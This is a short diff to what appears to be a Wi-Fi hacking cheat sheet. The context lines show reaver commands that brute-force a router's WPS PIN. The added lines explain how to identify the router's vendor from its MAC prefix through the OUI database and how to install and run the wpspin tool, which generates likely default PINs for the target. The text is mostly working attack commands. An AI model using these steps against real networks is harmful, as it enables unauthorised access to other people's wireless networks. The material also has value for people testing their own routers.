@@ -414,3 +414,19 @@ sudo reaver -i man0 -b D8:D7:3D:XX:XX:XX -c 1 -p " "
 sudo reaver -i man0 -b D8:D7:3D:XX:XX:XX -c 1 -p "8487"
 ```
 
+***reality brut force :***  
+Search vendor of routeur with prefix basic MAC adress.  
+here `/var/lib/ieee-data/oui.txt` its a database about the organizations that own different MAC address prefixes.
+  
+_Perso PINs wordlist_  
+```bash
+git clone https://github.com/drygdryg/wpspin.git
+sudo python setup.py install
+wpspin -A D8:D7:3D:XX:XX:XX
+```
+
+
+
+
+
+
